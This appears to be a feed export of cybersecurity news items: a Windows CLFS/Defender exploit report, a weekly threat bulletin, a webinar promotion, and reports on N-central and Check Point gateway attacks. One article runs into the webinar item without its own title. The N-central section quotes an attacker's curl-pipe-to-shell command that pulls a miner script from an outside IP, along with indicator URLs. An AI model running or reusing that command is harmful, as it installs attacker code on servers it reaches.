The exploit was tested on Windows 11 26H2, a Windows 11 26H2 Experimental build, and Windows Server 2025 Experimental, according to the repository. Systems are affected when the CLFS authentication registry mode is set to 0 (enforced) or 1 (learning). Systems older than 90 days typically move from learning to enforcement automatically, so the default configuration on established installations is the one the exploit targets.

A registry value of 2 or 3 means the mitigation is disabled. That takes the system outside the claimed attack surface, but the researcher and the driver's own documentation both warn against it: disabling lets CLFS parse tampered log files, reopening the memory corruption flaws the protection was built to prevent.

Independent Test

Sungyup Nam, head of research at Korean security firm 78researchlab, reported in a published assessment today that researcher Heewon Song of the firm's PurpleHound offensive content team tested the exploit and found that it works. Song assessed that it does not run reliably enough for operational use, Nam wrote.

Defender must be enabled for the published chain to succeed. Running the exploit changes every UAC prompt to open a standard user shell and a SYSTEM shell, blocking other actions and making the attack noticeable to anyone at the machine.

The repository claims the technique can work against any antimalware engine whose process runs with elevated privileges. That broader claim has not been tested.

What Defenders Can Do

No CVE, advisory, or patch for SignDrop appeared in the November security updates. The CISA Known Exploited Vulnerabilities catalog does not list it, and no attacks using the exploit have been reported.

Administrators can check their exposure by reading the CLFS authentication mode at HKLM\SYSTEM\CurrentControlSet\Services\CLFS\Authentication, where a Mode value of 0 or 1 falls within the researcher's claimed scope. The vendor's mitigation guidance describes the setting and the risks of disabling it.

The researcher has released a series of exploits targeting Windows and Defender since April. The vendor confirmed an earlier Defender exploit called RoguePlanet in June as CVE-2026-50656 and patched it the following month.

The ShieldBreak bypass followed in August and was assigned CVE-2026-69414. Three of the researcher's earlier Defender flaws have been exploited in attacks.

SignDrop is a different class of issue. Where the earlier exploits targeted race conditions in Defender's file handling, this one targets the CLFS driver's own authentication feature. The vendor's security update guide is the place to watch for a response.

item.title: ThreatsDay: 59 Linux Kernel Bugs, Falcon Spyware, GSocket Backdoors + 17 More Stories (2026)
item.description:
A search result isn't always safe. An access request isn't always harmless. And a familiar account doesn't always mean a familiar person is using it. Simple things to remember. Yet a surprising amount of this week's trouble starts right there.

Attackers are using fake websites, stolen access, and trusted tools to get into places they shouldn't be. AI is helping them build attacks faster, while also giving them new systems to target. Some intruders are staying hidden even after security holes are fixed. Others are moving stolen money through a maze of transactions. And researchers keep finding small coding mistakes that can cause much bigger problems. Different stories, but much of the trouble comes down to making something dangerous look normal.

There is some good news, too. Criminal servers have been seized, and a few defenses are getting stronger. Still, plenty of things are going wrong in ways that shouldn't be this easy. Here's what turned up this week.

The threats change every week. Subscribe, and we’ll alert you when each new ThreatsDay Bulletin is out.
  1. North Korea's crypto laundering network
    How North Korea Is Laundering $6.4B Stolen from Binance

    The North Korean threat actors linked to the record-breaking theft of $6.43 billion from Binance are using a highly complex and clearly automated method to launder the illicit proceeds. "Since the theft it has used more than 20,000 wallets on 16 blockchains, at least 36 services and at least 65,000 transactions," Dr. Tom Robinson, Elliptic's founder and chief scientist, said. "Around $3.0 billion remains in addresses linked to the theft, mostly as ETH and BTC. A negligible amount has likely been cashed out." The attackers have also been observed creating six meme coins on the NEAR blockchain network (FUK, OLCCL, MEILI, MMLI, DABI, and SINU) to launder a slice of the ill-gotten funds, passing through about $430,000 of the stolen cryptocurrency. The goal is to disguise the path of money and make it harder to trace where the assets eventually end up. Other tactics used to make funds tracing more difficult include moving between blockchains through bridges and cross-chain swap services, swapping between assets on DEXs, hopping through lending vaults and liquid-staking services, and mixing bitcoin through coinjoins, and ETH and SOL through the Privacy Cash privacy pool. The Binance breach is by no means the first to affect a major cryptocurrency exchange, but it is the biggest ever by magnitude. North Korean spokesperson Kim Yo Jong denied the country's role in the attack, calling it an "absurd" effort to "damage the international image of the DPRK."

  2. GSocket detections surge 356%
    Attacks Leveraging GSocket Spike in 2026

    Microsoft said it has observed multiple incidents in which threat actors deployed GSocket, an open-source remote access tool, on internet-facing Linux servers to maintain access after the original vulnerabilities were addressed, turning a single web application compromise into persistent access. "Because GSocket relays traffic through a shared public network, there is no threat actor-owned IP address or domain to block," Microsoft said. "Defenders should look for GSocket deployment, persistence, privilege escalation, and outbound connections on affected hosts, not treat application patching alone as complete remediation." According to telemetry data, devices with GSocket-related detections increased 356.2% from March through August 2026, with most of them associated with PHP web applications, cPanel hosts, and Apache. The majority of targets of GSocket activity are in the education and research sector, followed by technology and communications, manufacturing, and government entities.

  3. 235 servers seized in Europol takedown
    Europol Operation Dismantles GootLoader, CastleRAT, and StealC Infrastructure

    Europol, along with global partners, has disrupted the criminal infrastructure behind GootLoader, CastleRAT, and StealC malware, seizing 235 servers and 257 domains as part of an ongoing effort called Operation Endgame. Since 2018, GootLoader has infected at least 25,000 computers globally, and has been used in ransomware attacks of at least 44 U.S. based victims, leading to approximately $28.8 million in losses. Of the seized infrastructure, 120 servers and 39 domains are linked to CastleRAT. "The operation targeted 'cybercrime-as-a-service' models, where these tools enabled further crimes like ransomware attacks and data theft," Europol said. As part of the operation, authorities have identified over 6 million victim credentials. "The suspects were using these credentials, stolen from the victims after they infected them, to sell them and later be used for other cyber-attacks such as ransomware," Europol added.

  4. Browser-based espionage targets governments
    Hackers Deploy Falcon Browser Spyware to Monitor Government Emails and Steal Passwords

    A command and control (C2) framework called Falcon (aka XG or Xiàng Gē) has been found compromising victims' browsers by running malicious JavaScript. Falcon shares near-identical URL structures, payload delivery mechanisms and communication protocols with PeckBirdy, another JavaScript C2 framework that came to light early this year. It's assessed that Falcon and PeckBirdy represent variants of the same core framework. "An actor leveraged Falcon to compromise visitors of webmail portals and government web applications by placing malicious JavaScript directly within these sites," Palo Alto Networks Unit 42 said. "Operating entirely inside the browser context, attackers have used the framework to sideload malicious Chrome extensions and steal the following information: passwords, emails, session cookies, [and] communications." Falcon has also been used to deliver an implant dubbed Antino, which uses Microsoft OneDrive as a C2 channel. The activity has targeted government entities in one Middle Eastern country and four Southeast Asian countries between March and May 2026. "The campaigns we observed targeted ministries of foreign affairs, defense and interior, and law enforcement agencies, consistent with strategic intelligence collection objectives," Unit 42 said.

  5. 59 Linux kernel bugs uncovered
    Microsoft Flags 59 Linux Kernel Bugs

    Microsoft said its scan of a subset of Linux kernel subsystems from late May to mid-June 2026 unearthed 26,502 raw findings using MDASH, which subsequently formed the basis for 59 public upstream reports and 33 assigned CVEs. This includes working root privilege-escalation exploits for eight of those CVEs, such as CVE-2026-64563. "CVE-2026-64563 is a one-line state-reset bug in rhashtable, the Linux kernel's shared resizable hash table," Microsoft said. "Because callers trust the object pointers returned by a table walk, this small library flaw enabled a stable local privilege escalation on Linux -- and affected Android with SELinux enforcing -- without requiring special kernel configurations or user namespaces."

  6. AI-assisted espionage in Central Asia
    Silent Lynx Hackers Use AI Agent to Steal 2,000+ Tajik Government Documents

    An exposed Silent Lynx server has uncovered cyber espionage operations targeting Central Asian governments and critical infrastructure from April to October 2026. "The directory held the group's tooling alongside data from active intrusions into government and critical infrastructure organisations across the region, and the AI agent the operator relied on to run them," CloudSEK said. "We assess with medium confidence that the operator has a Kazakhstan nexus: the operation runs in Russian, and the operator's own test traffic came from a residential Kazakh connection, which supports existing vendor assessments. The collection priorities, spanning transport, defence correspondence and resource ministries in neighbouring states, point to regional intelligence gathering rather than financial motive."

  7. Contractor access fuels ransomware attacks
    Citrus Ransomware Hackers Abuse Contractor Access, VLESS Tunnels, and AI-Generated Scripts

    A new Russian-speaking ransomware group called Citrus is targeting Windows systems in corporate environments. The attackers have been found to gain access through compromised contractor accounts and leverage AI-generated PowerShell scripts, batch files, and commands during later stages of the intrusion. In an attempt to reduce visibility, the threat actor removes tools and output files after execution, clears command history, and deletes event logs. The group also disguises tools and related artifacts with benign-looking names to make them appear legitimate by using a trusted brand name. The ransomware is a Sn00py-family ransomware variant written in Go. On Windows systems, the malware encrypts user files and appends the .citrus extension, while taking steps to hinder recovery and incident response. Kaspersky said the activity shares several similarities with Toy Ghouls. "Citrus stands out for the way AI-generated content appears to support hands-on intrusion activity on compromised systems," said Stanislav Larinsky, Kaspersky Security Services expert. "In the cases we investigated, the attackers combined third-party account access, privilege-escalation attempts and domain-wide deployment techniques. These incidents show how limited contractor access can become a path to broader compromise if it is not tightly controlled and continuously monitored."

  8. Malicious AI agents exploit OAuth consent
    New BluePhishing Attack Tricks Microsoft Entra Users Into Granting AI Agents Cloud Access

    Proofpoint has disclosed details of a new technique called BluePhishing that's described as the "next evolution of OAuth consent abuse," enabling bad actors to leverage agent identities like Microsoft Entra Agent ID for initial access. BluePhishing "socially engineer[s] victims into granting consent to a malicious agent blueprint for initial access," it said. "Analogous to app consent phishing where attackers use client credentials to gain initial access to a tenant, BluePhishing extends this technique to the agent ecosystem. By exploiting gaps in visibility and governance around emerging AI agent adoption, attackers can abuse one-time consent links to create agent identities in target tenants, obtain access tokens, and operate with the privileges assigned to those agents."

  9. AI age checks expand worldwide
    Meta Expands Teen Account Protections Globally

    Meta has announced that it's expanding its AI age-estimation technology globally to automatically place millions of teens in Teen Account protections on Instagram. "We use AI technology to find people we suspect to be teens, even if they use an adult birthday, and place them in Teen Account protections," Meta said. "As a result, millions more teens across the world who use Instagram will receive these built-in protections, even if they've misrepresented their age." In Australia, Meta has opted to use Apple's age-range signal as another method to help understand age.

  10. OAuth support for Exchange migrations
    Microsoft Supports OAuth Authentication for On-Premises Exchange Mailbox Migrations

    Microsoft 365 Mailbox Replication Service (MRS) has added support for OAuth as an authentication method when migrating mailboxes between Microsoft 365 and an on-premises Exchange environment. "Once OAuth for MRS is configured, tenant administrators can create an OAuth migration endpoint and use it in migration batches or in onboarding and offboarding move jobs," Microsoft said. "You can use this method in both hybrid and non-hybrid organizations."

  11. NTLM signing hardened against relay attacks
    Microsoft Enables NTLM Signing by Default in Windows to Reduce Relay Attacks

    In more Microsoft-related news, the tech giant has incorporated additional protections into Windows starting November 10, 2026, that address CVE-2026-118737 (CVSS score: 8.1), a critical remote code execution flaw in Remote Procedure Call Runtime that could allow an unauthorized attacker to execute code over a network. "These updates represent the first phase of improvements to NTLM message signing," Microsoft said. "These changes help ensure that authenticated NTLM sessions always establish a cryptographic session key and negotiate real message signing, reducing exposure to relay attacks." To that end, Windows servers will begin requiring NTLM signing by default starting May 2027.

  12. Exposed cloud credentials lingered 18 months
    Entra ID Issue Impacting Planning Inspectorate Disclosed

    Details have emerged about a now-patched security flaw affecting the Planning Inspectorate, an executive agency of the United Kingdom's Ministry of Housing, Communities and Local Government (MHCLG). The issue involved a complete Microsoft Entra ID application credential that was committed in plaintext to a GitHub repository. "Although removed from the branch, the commit was orphaned via a force push and remained retrievable via GitHub's raw object CDN for 18 months," ControlPlane said. The client secret was deleted about 20 minutes after responsible disclosure on August 26, 2026.

  13. Fake software sites spread infostealer
    SEO Poisoning Campaign Delivers Armorsteal

    An SEO poisoning campaign is using fake websites impersonating the Chocolatey package manager and the Microsoft Activation Scripts (MAS) tool to distribute a Python-based malware called Armorsteal. "The installer deployed a Python 3.11 runtime environment and three main components providing remote access, surveillance, and information stealing capabilities, with the Python code protected by Pyarmor," Zscaler said. "The remote access component communicates with a command-and-control (C2) server, downloads additional modules, and executes remote tasks. The surveillance component logs keystrokes, monitors the clipboard, captures screenshots, and displays fake cryptocurrency wallet notifications. The information stealing component targets browser data, Discord tokens, cryptocurrency wallets, seed phrases, saved passwords, SSH keys, and Steam data."

  14. Localized phishing delivers banking trojan
    Grandoreiro Campaign Targets LATAM

item.title: Webinar: See How Identity Blind Spots Put Your SOC at Risk and How to Close Them (2026)
item.description:
Security teams have more alerts, logs, and monitoring tools than ever. Yet when an attack happens, one simple question can still take too long to answer: Who or what is behind this activity, and what can they access?

A suspicious login might belong to an employee. An unusual API call could come from a machine account. Or an AI agent might be accessing sensitive systems using permissions nobody has reviewed recently.

Your SIEM or EDR may catch the activity. But without knowing who owns that identity, what permissions it has, and which systems it can reach, your SOC is missing a critical part of the story.

And that missing context can turn a manageable incident into a much bigger problem.

Join this expert-led webinar to learn how real-time identity context can help your SOC investigate threats faster, understand what's at risk, and respond with confidence.

The Blind Spot Between Identity and Security Operations

Here's the problem.

Identity and access management (IAM) teams know who has access to what. Security operations teams monitor suspicious activity and respond to threats.

But these teams often work with different tools, different data, and different priorities.

When an alert comes in, SOC analysts may know what happened but still struggle to understand what it means.

Consider a compromised service account. An analyst might detect suspicious activity, but several questions remain:

  • What applications and systems can this account access?
  • Could an attacker use it to move deeper into the network?
  • How much damage could it cause?
  • Can the account be disabled without breaking a critical business process?

These answers matter. Blocking the wrong identity can disrupt production. Waiting too long can give an attacker more room to move.

And with machine identities and autonomous AI agents becoming part of everyday operations, the problem is getting more complicated.

More Identities, More Access, More Risk

Traditional security monitoring was largely built around users, devices, and network activity.

Today, organizations also rely on service accounts, API keys, automated workloads, and AI agents that can act without direct human involvement.

These identities often have access to important systems and data.

If one is compromised, detecting the suspicious action is only the beginning. Security teams also need to understand its permissions, connections, and potential impact.

That's where identity context changes the investigation.

Instead of treating every alert as an isolated event, analysts can connect suspicious activity to the identity behind it, understand how far an attacker could move, and choose a response that limits damage without unnecessarily interrupting operations.

📅 Save Your Spot: See how identity context can improve your SOC response in this free webinar.

What Does a Better SOC Response Actually Look Like?

The goal isn't to add another dashboard or generate more alerts.

It's to give analysts the information they need when an incident is unfolding.

That means connecting identity intelligence with existing SIEM and EDR alerts, so teams can:

  • Investigate faster: Understand which human, machine, or AI identity is involved.
  • See the real risk: Identify permissions, connected systems, and potential lateral movement.
  • Contain threats safely: Respond to compromised credentials without unnecessarily disrupting critical automation.
  • Work better together: Give IAM and SOC teams shared workflows, clear escalation paths, and common response goals.

The difference is simple: knowing that something suspicious happened is useful. Knowing what it can affect and how to stop it is far more valuable.

Learn How to Close the Gap

In the upcoming webinar, Fuel the SOC with Identity Context: Securing Humans, Machines, and AI Agents, security experts will explore how organizations can bring IAM and security operations together.

Drawing on real-world enterprise deployments, the session will cover practical approaches to enriching security alerts with identity context, investigating lateral movement, understanding the potential blast radius of an attack, and improving incident response without disrupting production systems.

It will also explain how teams can align around shared metrics, escalation processes, and response playbooks.

Your SOC already has the alerts. Now give it the context to act.

Register for the free webinar and learn how to turn identity intelligence into faster, smarter security response.

"We are restricting certain N-central features and integrations," the company said in a Thursday update. "These measures may affect some functionality, but we believe taking additional precautions while remediation is completed is the right action to protect our partners and their customers."

The following actions have been applied to Hosted environments -

  • Legacy API is turned off by default in the product.
  • Intune integration has been turned off while additional protections are implemented and validated.

Hosted customers are also being recommended to follow N-able's previous guidance to upgrade Agents and Probes on N-central version 2026.4 HF1 and above, as the update introduces changes in how the Probe and Agent communicate.

"N-able N-central 2026.4 HF1 updates legacy components of the Agent and Probe, which changes how the two communicate," it said. "As such, upgrading both Agents and Probes in your N-central server is a MUST to ensure all managed devices are communicating and patched."

On-premises customers are being urged to upgrade Agents and Probes and ensure Legacy API access is disabled in the environment, if it has been previously turned on.

"Our teams are actively assessing the new disclosures, developing additional remediation, and working to safely restore affected functionality," N-able said. "Protecting our partners and their customers remains our highest priority, and we will continue to take precautionary action where necessary."

The development comes as independent security researcher Sean Bales disclosed two new sets of flaws called 4EverAble2Shell and Agent2Shell that work against the latest version of N-central and can allow attackers to execute arbitrary code as root and gain SYSTEM-level access to Windows systems under specific conditions.

Multiple threat intelligence reports show that 4EverAble2Shell has moved beyond preliminary probing to active exploitation efforts, with threat actors leveraging it to deploy cryptocurrency miners on vulnerable servers.

The attacks have been found to string together a critical Apache Axis vulnerability, tracked as CVE-2026-90436 (CVSS score: 9.8), with a separate N-central privilege escalation weakness to obtain root-level access.

"An unauthenticated exploit chain in N-able N-central, disclosed as 4EverAble2Shell, is reported to allow remote attackers to execute arbitrary operating-system commands with root privileges," Previdian, which is tracking the flaw as VULN-2026-0009, said.

"The chain exploits unsafe class instantiation during SOAP fault processing in the bundled Apache Axis component. A crafted request causes an attacker-selected JLine class to process malicious input, resulting in command execution as the nable service account."

In an exploit chain detailed by the threat intelligence company, threat actors have been observed attempting to download and execute a shell script ("jup.sh") from an attacker-controlled server at "157.20.241[.]16," while sending back diagnostic information and command output to the server. 

Cybersecurity company Huntback has also revealed that the same IP address is weaponizing the 4EverAble2Shell flaw, deploying an XMRig Monero cryptocurrency miner on 21 N-central servers via the aforementioned shell script -

mount -o remount,exec /tmp 2>/dev/null; curl -fsSL hxxp://157.20.241[.]16:8080/jup.sh | sh -s nc_[target-IP-redacted]

The miner is designed to use only half of the available CPU cores, likely in an effort to fly under the radar. The compromised N-central servers are concentrated across the U.S., South Africa, Canada, the U.K., Germany, France, and Sweden.

"The miner is the only payload we have seen, but the escalation hands the operator root on a host that manages your customers' endpoints," Huntback said. "Treat a hit as a full compromise, not a cleanup job. Applying Hotfix 2 is not enough on its own: 19 of the victims here were already running it."

Update

N-able has confirmed that threat actors are targeting customers who have not disabled the Legacy API. It has shared the following indicators of compromise (IoCs) -

  • URLs:
    • 157.20.241[.]16:8080/jup.sh
    • 157.20.241[.]16:8080/xvgz
    • 157.20.241[.]16:8080/xmrig.tgz
    • 157.20.241[.]16:8080/ob/cronhit?h=jup_start_<rig>&persist=<method>
    • 157.20.241[.]16:8080/ob/fcheck
  • Outbound traffic:
    • 157.20.241[.]16 (ports 8080, 19202 to 19418)
    • 139.99.69[.]109:10128
    • 79.76.51[.]56:39100

It's worth noting that the IP address "157.20.241[.]16" matches the activity detailed by Previdian and Huntback.

"We remain committed to completing the necessary security assessments and remediation efforts while prioritizing the protection of our customers and their environments," the company said.

N-able Plans Phased Rollout

In an update shared on November 16, 2026, at 2:07 a.m. UTC, N-able said it's readying to ship 2026.4 HF3 release and that it's currently going through testing and final validation steps.

"Our current plan remains a phased rollout approach, beginning with N-central Hosted NCOD environments tonight, followed by 2026.4 HF3 availability for N-central On-premises customers on Monday, subject to successful completion of testing and validation," it added.

item.title: Hackers Exploit PHP2Shell Flaws in Check Point Gateways to Deploy TSGA Backdoor and Wipe ESXi Files (2026)
item.description:
An unknown threat actor has been observed targeting unpatched Check Point Security Gateways to obtain initial access via the PHP2Shell vulnerabilities and then a previously unreported local privilege escalation flaw in Gaia OS  to deploy a backdoor called TSGA.

The activity, detailed by Check Point, began on October 30, 2026, and targeted Israeli organizations, with a broader follow-up wave on November 2, 2026, that targeted organizations across multiple countries and sectors. Some of the organizations singled out in the first wave have also been at the receiving end of destructive actions that include the deployment of wiper malware.

"PHP2Shell provided initial access, followed by privilege escalation through the DynamicCLI interface, tracked as CVE-2026-123039," Check Point said. "The attackers then deployed PHP web shells, the persistent TSGA backdoor, and its embedded TSProxy networking component."

"The attackers pivoted from the gateway to a VMware ESXi host over SSH, deployed the destroy_v6 wiper, and left politically themed DREAM_ANNEXATION.txt notes during the destructive stage."

CVE-2026-123039 (CVSS score: 7.8) is a missing authorization flaw that could enable privilege escalation to root in the DynamicCLI process, enabling any authenticated local user to run arbitrary commands by writing a single request to the socket.

"The issue is a local privilege escalation and requires the attacker to already have local code execution on the appliance," Check Point said, adding it "observed an active exploit of this vulnerability against a couple of dozen customers."

The issue impacts versions R82.20, R82.10, R82, R81.20, R81.10, and R81 of the following products -

  • Check Point Force Firewalls
  • Check Point Management and Log Servers
  • Multi-Domain Security Management and Multi-Domain Log Server
  • Maestro Orchestrator

"In late October 2026, approximately one week after a security fix became available, activity originating from 130.94.19[.]204 targeted Israeli organizations through vulnerable Mobile Access portals on Check Point Security Gateways," Check Point said.

"Evidence suggested some cases of a successful compromise, with exploitation activity consistent with PHP2Shell, associated with CVE-2026-109618 and CVE-2026-109619."

After obtaining initial access, the unknown hacking group is said to have escalated privileges from the portal service account to root by weaponizing CVE-2026-123039 and deploying PHP web shells with an aim to establish persistent access. The web shells support command execution and file upload capabilities.

The November 2, 2026, wave is said to have targeted some Israeli organizations that had already been targeted in the first wave, alongside other organizations worldwide, without demonstrating any specific geographic or sector preference, indicating an opportunistic initial-access effort.

The access afforded by the web shell paves the way for TSGA, a standalone passive backdoor that also includes a second component called TSProxy. TSGA, deployed as slot_CPconfigdaemon, has been described as a Linux gateway implant with Check Point-specific functionality, offering encrypted remote access, configuration theft, backup and snapshot persistence, process injection, and binary firewall-log tampering.

"[TSProxy's] injection code loads this library into selected appliance processes, where it intercepts networking functions to handle specially marked attacker connections while allowing ordinary traffic to continue," Check Point said. "This combines a persistent standalone backdoor with concealed access through existing appliance services."

Some of the other post-exploitation actions observed are listed below -

  • Deploying the gogo scanner on the gateway to discover internal assets and services across the network.
  • Moving laterally to a VMware ESXi host over SSH by authenticating with the vpxuser service account.
  • Staging a Linux ELF wiper called destroy_v6 and executing it. The malware recursively traverses the target directory and deletes all files regardless of their extension. It also attempts to overwrite files with zeros before deleting them.
  • Dropping a note named "DREAM_ANNEXATION.txt" in each processed directory.

Both TSGA and TSProxy are assessed to be Check Point-specific components of a toolkit dubbed PhiliKit that was first documented by ESET in  June 2026, attributing it to a China-nexus cyber espionage group tracked as Armory Castle (formerly UNC5221).

Other factors that point to the involvement of a possible China-aligned threat actor include the use of LightNode VPS infrastructure and the fact that scanning activity was concentrated between 12 and 9 a.m. UTC, coinciding with typical Chinese working hours.

However, the cybersecurity company said it does not have enough evidence to link the latest campaign to the threat actor or other known Chinese-nexus groups, citing the following reasons -

  • Use of wiper malware
  • Focus on Israel and explicit references to the Israeli-Palestine conflict in the wiper note

"Taken together, the evidence does not allow us to assess with high confidence the true nature of this operation," Check Point said. "Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation. It is also possible that the destructive activity served as a smoke screen."

Update

The U.S. Cybersecurity and Infrastructure Security Agency, on November 13, 2026, added CVE-2026-123039 to its Known Exploited Vulnerabilities (KEV) catalog, requiring federal agencies to apply the patch by November 16, 2026.
